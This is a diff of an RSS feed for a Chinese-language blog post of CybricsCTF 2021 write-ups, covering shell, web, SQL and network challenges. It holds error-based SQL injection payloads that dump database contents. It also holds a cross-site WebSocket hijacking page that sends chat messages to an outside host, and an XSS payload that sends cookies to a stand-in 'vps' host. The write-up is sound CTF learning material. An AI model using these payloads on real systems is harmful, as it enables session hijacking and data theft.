@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/ctf/</link><description>Recent content in CTF on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 27 Jul 2021 14:32:12 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>CybricsCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/07/27/cybricsctf2021-wp/</link><pubDate>Tue, 27 Jul 2021 14:32:12 +0800</pubDate><guid>https://amiaaaz.github.io/2021/07/27/cybricsctf2021-wp/</guid><description>&lt;h2 id="mic-check-cyber-baby-50-pts">Mic Check (Cyber, Baby, 50 pts)&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/categories/ctf/</link><description>Recent content in CTF on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 29 Jul 2021 17:02:12 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/categories/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>CybricsCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/</link><pubDate>Thu, 29 Jul 2021 17:02:12 +0800</pubDate><guid>https://amiaaaz.github.io/2021/07/29/cybricsctf2021-wp/</guid><description>&lt;h2 id="mic-check-cyber-baby-50-pts">Mic Check (Cyber, Baby, 50 pts)&lt;/h2>
 &lt;blockquote>
 &lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
 &lt;p>Those organizers are changing &lt;a href="https://cybrics.net/rules">game rules&lt;/a> all the time! There’s a flag there, and it’s not that easy to capture.&lt;/p>
@@ -19,6 +19,21 @@
 别的都还算正常吧 就是都不太像其实 有star, goose, flag, flower, ring, house, bone&amp;hellip;. 最后一个是二维码 比较麻烦&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203314255.png" alt="image-20210724203314255">&lt;/p>
 &lt;p>再稍微调整一下尺寸，扫描就行了&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203713402.png" alt="image-20210724203713402">&lt;/p>
+&lt;h2 id="rm--rfer-ctb-baby-166-pts">rm -rf’er (CTB, Baby, 166 pts)&lt;/h2>
+&lt;blockquote>
+&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
+&lt;p>Alarm! We accidentally did &lt;code>rm -rf /*&lt;/code> on a very important server. Now all that’s left is one shell session.&lt;/p>
+&lt;pre>&lt;code>ssh rmrfer@178.154.210.26
+Password: sa7Neiyi
+&lt;/code>&lt;/pre>&lt;p>Rescue the &lt;strong>flag.txt&lt;/strong> file from one of the directories by only using your shell&lt;/p>
+&lt;p>&lt;strong>Added at 13:45 —&lt;/strong> frequent question: yes, if you found &lt;code>flag.txt&lt;/code>, the flag is right there, in the open, as plain text. Just read it. If you’re not seeing the flag, try to find another method that will not hide info from you&lt;/p>
+&lt;/blockquote>
+&lt;p>这个题 emmmmm
+只要ssh一连接就会自动执行&lt;code>rm -rf /*&lt;/code>的指令，当反应过来的时候系统已经删的连ls指令都不剩了&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729003620922.png" alt="image-20210729003620922">&lt;/p>
+&lt;p>先说非预期解吧：当输入连接密码后立刻ctrl+c 只要够快 就执行不了&lt;code>rm -rf /*&lt;/code>，之后就可以顺畅的穿梭于这个buildbox之间拿flag了&lt;/p>
+&lt;p>预期解则是这样的：当系统执行删除命令后 很多外部指令都被删除 需要通过仅剩的一些内置函数完成&amp;quot;read&amp;quot;的功能；从之前的报错信息可知 buildbox使用的是tcsh，在tcsh中&lt;code>echo $&amp;lt;&lt;/code>命令相当于&lt;code>read&lt;/code>函数，读入标准输入并输出；tcsh中加括号的命令都会在子shell中运行；构造payload &lt;code>(echo &amp;quot;$&amp;lt;&amp;quot;) &amp;lt; /etc/ctf/flag.txt&lt;/code>，即 读取flag.txt并输出&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729005544665.png" alt="image-20210729005544665">&lt;/p>
 &lt;h2 id="ad-network-web-baby-50-pts">Ad Network (Web, Baby, 50 pts)&lt;/h2>
 &lt;blockquote>
 &lt;p>Author: Alexander Menshchikov (&lt;a href="https://t.me/n0str">@n0str&lt;/a>)&lt;/p>
@@ -27,10 +42,10 @@
 &lt;p>There is a flag 1337 redirects deep into the network&amp;hellip;&lt;/p>
 &lt;/blockquote>
 &lt;p>&lt;del>这个我是不知道怎么做……页面上的任何链接部分都是自己页面内的跳转，提示的是redirect重定向，可是抓包后没有302 也没有一直在做重定向呀 要怎么看呢？&lt;/del>&lt;/p>
-&lt;p>emmmm 现在是第二天 正好有个空闲时间 想再试一试这个题 用的是burp的自带的chromium的浏览器（之前是知道这个 但是没有用过）欸 页面左上角显示了一个gif图。
-这个图在昨天做的时候看到， 内容是 &lt;em>awesome ad from adnetwork&lt;/em>，但是edge浏览器在加载这个图的时候会自动阻止 我单独看了内容也没发现什么特别的 就没有注意这里。事后角度看这里 其实一个Gif图被阻止请求应该是很反常的事情，应该首先引起注意的&amp;hellip;.&lt;/p>
+&lt;p>emmmm 在比赛第二天再次尝试的时候用burp的自带的chromium的浏览器（之前是知道这个 但是没有用过）欸 页面左上角显示了一个gif图
+这个图在昨天做的时候看到， 内容是 &lt;em>awesome ad from adnetwork&lt;/em>，但是edge浏览器在加载这个图的时候会自动阻止 我单独看了内容也没发现什么特别的 就没有注意这里。事后角度看这里 其实一个Gif图被阻止请求应该是很反常的事情，应该首先引起注意的&amp;hellip;&amp;hellip; &lt;del>（都怪edge!!!&lt;/del>&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725133924877.png" alt="image-20210725133924877">&lt;/p>
-&lt;p>在burp自带的chromium中 点击gif会有单独的弹窗出来，提示重定向次数过多；看burp中的抓包记录 确实多的离谱，按照题目中的提示 得有1337层，得上个脚本慢慢跑了 这个比较好弄&lt;/p>
+&lt;p>点击gif会有单独的弹窗出来，提示重定向次数过多；看burp中的抓包记录 确实多的离谱，按照题目中的提示 得有1337层，得上个脚本慢慢跑了 这个比较好弄&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725134346221.png" alt="image-20210725134346221">&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
 &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://adnetwork-cybrics2021.ctf.su/adnetwork&amp;#34;&lt;/span>
@@ -65,7 +80,10 @@ digest=5c07c683d062d17ec799fa177ce88058&amp;amp;email=1',1)# // 报错：Somethi
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">insert&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table_name&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">email&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">timestamp&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">values&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">email&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">now&lt;/span>&lt;span style="color:#111">());&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>可利用的部分是可以插入的email，报错注入&lt;/p>
 &lt;pre>&lt;code>digest=e1e79bd6fafe38f7073ec1f3ef1513fa&amp;amp;email=1',1 or updatexml(1,concat(0x7e,database()),0))# // Something went wrong during database insert: XPATH syntax error: '~announcement'
-&lt;/code>&lt;/pre>&lt;p>（当时算是做了一半 然后出门了 这几天放假回家 先和朋友玩两三天 抽空把剩下的写了&lt;/p>
+digest=c9f14624524736a74164cc6024fdefce&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='announcement')),0) or ' // Something went wrong during database insert: XPATH syntax error: '~emails,logs'
+digest=94707222b90505ab0aa5e1fd3916e77d&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='announcement' and table_name='logs')),0) or ' // Something went wrong during database insert: XPATH syntax error: '~log'
+digest=66bf6db11d9bee8e897b874a430f5704&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or ' // Something went wrong during database insert: XPATH syntax error: '~cybrics{1N53r7_0ld_900d_5ql}'
+&lt;/code>&lt;/pre>&lt;p>没什么好说的，经典报错注入流程：确定字段数-&amp;gt;爆数据库名(announcement)-&amp;gt;表名(emails, logs)-&amp;gt;字段名(log)-&amp;gt;具体数据 拿flag&lt;/p>
 &lt;h2 id="multichat-web-medium-138-pts">Multichat (Web, Medium, 138 pts)&lt;/h2>
 &lt;blockquote>
 &lt;p>Author: Alexander Menshchikov (&lt;a href="https://t.me/n0str">@n0str&lt;/a>)&lt;/p>
@@ -79,33 +97,141 @@ digest=5c07c683d062d17ec799fa177ce88058&amp;amp;email=1',1)# // 报错：Somethi
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724225447805.png" alt="image-20210724225447805">（websocket这块知识印象中之前接触过一次 也就一次 相关链接还是放后面&lt;/p>
 &lt;p>链接里的一个csrf攻击的实例跟这个有点像了&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724232946228.png" alt="image-20210724232946228">&lt;/p>
-&lt;p>但是这里的又不太一样，websocket最初建立时的http部分 cookie中有chatroom的id，这个值是未知的（&lt;em>Admin and tech support are members of a secret chat room.&lt;/em>）；另外tech support是先会发*‘Hey, i forgot the flag. Can you remind me?’*，需要的是触发（如果它不会自己发这一条内容的话？ 跟题目里那个team token有无关系？）和监听它的信息 然后捕捉到它的下一条admin发送的内容，拿到flag&lt;/p>
-&lt;p>具体的实现不知道该怎么弄了&lt;/p>
-&lt;p>看了tg里有老哥发的脚本是这样的&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#75715e">&amp;lt;!DOCTYPE html&amp;gt;&lt;/span>
-&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
+&lt;p>但是这里的又不太一样，websocket最初建立时的http部分 cookie中有chatroom的id，这个值是未知的（&lt;em>Admin and tech support are members of a secret chat room.&lt;/em>）；另外tech support是先会发*‘Hey, i forgot the flag. Can you remind me?’*，需要的是触发（如果它不会自己发这一条内容的话）和监听它的信息 然后捕捉到它的下一条admin发送的内容，拿到flag&lt;/p>
+&lt;p>（比赛的时候就想到这里，具体的实现不知道该怎么弄了，以下是看了wp之后的复现）&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001013129.png" alt="image-20210728001013129">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001122843.png" alt="image-20210728001122843">&lt;/p>
+&lt;p>5000端口处有Support页面，tech support在这里可以访问任意的页面并建立websocket发送消息，不限制跨域 所以可以将自己的网站写到这里，support会带着它的cookie（和admin在一个房间里 cookie是房间id）过来访问，然后借助js的脚本拿到它的cookie；以下是&lt;a href="https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw">来自w&amp;amp;m的脚本&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
 &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
-&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
-&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">WebSocket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ws://multichat-cybrics2021.ctf.su/ws&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hey, i forgot the flag. Can you remind me?&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#111">};&lt;/span>
-&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onmessage&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://b5hr0mbtx5rumgnakf6fpxvzfqlg95.burpcollaborator.net/&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">btoa&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">));&lt;/span>
-&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://b5hr0mbtx5rumgnakf6fpxvzfqlg95.burpcollaborator.net/aha&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#75af00">mode&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;no-cors&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
-&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">data&lt;/span>
-&lt;span style="color:#111">});&lt;/span>
-&lt;span style="color:#111">};&lt;/span>
-&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
 &lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
 &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
-Well cum
+&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;text/javascript&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
+&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#75af00">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">WebSocket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ws://multichat-cybrics2021.ctf.su/ws&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onclose&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#ae81ff">1003&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`Status: &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">reason&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Connection closed.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">item&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;span style="color:#111">};&lt;/span>
+&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;connected&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;span style="color:#111">};&lt;/span>
+&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onmessage&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
+&lt;span style="color:#111">};&lt;/span>
+&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">(){&lt;/span>
+&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hey, i forgot the flag. Can you remind me?&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2000&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">};&lt;/span>
+&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
 &lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
-&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>emmmm 是我想复杂了？看样子跟前面的cookie没有半毛钱关系 中间用的burp collaborator server之前在做portswigger的题的时候有用到过 但当时也没细究这个是干什么的（查了资料 相关链接还是放后面了 这个确实功能还挺强大的 可以可以）
-自己复现了一下，emmmm 没成功&amp;hellip;&amp;hellip;.? 是哪里出了问题？&lt;/p>
-&lt;p>tg上看到另一种解法是xss？也没打通&lt;/p>
-&lt;p>参考：&lt;a href="https://www.runoob.com/html/html5-websocket.html">HTML5 WebSocket&lt;/a> &lt;a href="https://wiki.wgpsec.org/knowledge/web/websocket-sec.html">WebSocket安全问题分析&lt;/a> &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Request/mode">Request.mode&lt;/a> &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch">使用 Fetch&lt;/a> &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WindowOrWorkerGlobalScope/fetch">WorkerOrGlobalScope.fetch()&lt;/a> &lt;a href="https://www.freebuf.com/news/193447.html">Burpsuite Collaborato模块详解&lt;/a> &lt;a href="https://blog.fabiopires.pt/running-your-instance-of-burp-collaborator-server/">Running Your Instance of Burp Collaborator Server&lt;/a>（列入待完成计划&lt;/p></description></item></channel></rss>
+&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者非预期解：在url部分进行xss，payload: &lt;code>javascript:location.href='http://vps/?cookie='+document.cookie&lt;/code>（此处用的是burp collaborator）直接可以获取房间号，连入房间后发消息即可拿到flag&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729144122926.png" alt="image-20210729144122926">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729143946243.png" alt="image-20210729143946243">&lt;/p>
+&lt;p>参考：&lt;a href="https://www.runoob.com/html/html5-websocket.html">HTML5 WebSocket&lt;/a> | &lt;a href="https://wiki.wgpsec.org/knowledge/web/websocket-sec.html">WebSocket安全问题分析&lt;/a> &lt;a href="https://segmentfault.com/a/1190000014582485">WebSocket断开原因分析&lt;/a> | &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Request/mode">Request.mode&lt;/a> &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch">使用 Fetch&lt;/a> | &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WindowOrWorkerGlobalScope/fetch">WorkerOrGlobalScope.fetch()&lt;/a> | &lt;a href="https://www.freebuf.com/news/193447.html">Burpsuite Collaborator模块详解&lt;/a> | &lt;a href="https://blog.fabiopires.pt/running-your-instance-of-burp-collaborator-server/">Running Your Instance of Burp Collaborator Server&lt;/a>（列入待完成计划&lt;/p>
+&lt;h2 id="ascii-terminal-network-baby-116-pts">ASCII Terminal (Network, Baby, 116 pts)&lt;/h2>
+&lt;blockquote>
+&lt;p>Author: Artur Khanov (&lt;a href="https://t.me/awengar">@awengar&lt;/a>)&lt;/p>
+&lt;p>At &lt;code>138.68.83.253:3333&lt;/code> you have an ASCII terminal. It really works, check with the &lt;a href="https://cybrics.net/files/id.txt">&lt;strong>id command&lt;/strong>&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>nc连上以后可以看到一个bash $，题目的提示是&amp;quot;ASCII termial&amp;quot;&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728231402633.png" alt="image-20210728231402633">&lt;/p>
+&lt;p>把要执行的命令也表示成这种形式后发送即可，这里使用的是linux下的toilet工具&lt;/p>
+&lt;p>toilet可以把字母拼成用字符或其他方式表示的更大的字母，可以带一些参数来控制字体 字号以及样式 比如&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234413850.png" alt="image-20210728234413850">&lt;/p>
+&lt;p>可以玩出很多花样~&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234351668.png" alt="image-20210728234351668">&lt;/p>
+&lt;p>书归正题，这里使用&lt;code>toilet -f bigascii9 +command&lt;/code>的命令生成结果，将空格换为 &lt;code>.&lt;/code>再发送即可&lt;/p>
+&lt;pre>&lt;code>toilet -f bigascii9 ls &amp;gt; ls.txt
+cat ls.txt | nc 138.68.83.253 3333 &amp;gt; ls_result.txt
+toilet -f bigascii9 'cat flag.txt' &amp;gt; cat.txt
+cat cat.txt | nc 138.68.83.253 2333 &amp;gt; flag.txt
+&lt;/code>&lt;/pre>&lt;p>（值得注意的是 如果直接使用上面的命令生成相应文件后用vim编辑器的&lt;code>%s/\s/./g&lt;/code>命令来进行空格的替换，会出现下面这样的情况 首部和尾部都需要手动修正一下&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729002105318.png" alt="image-20210729002105318">&lt;/p>
+&lt;p>最后flag：cybrics{T3553R4C7_15_GOOD}&lt;/p>
+&lt;p>————ps：在赛后的官方youtube直播讲解中展示了这个ascii terminal的源码，是使用python编写的 对这个terminal的运行感兴趣的可以到&lt;a href="https://www.youtube.com/watch?v=SFnj6DRTIzE&amp;amp;t=2605s">录播视频&lt;/a>中看&lt;/p>
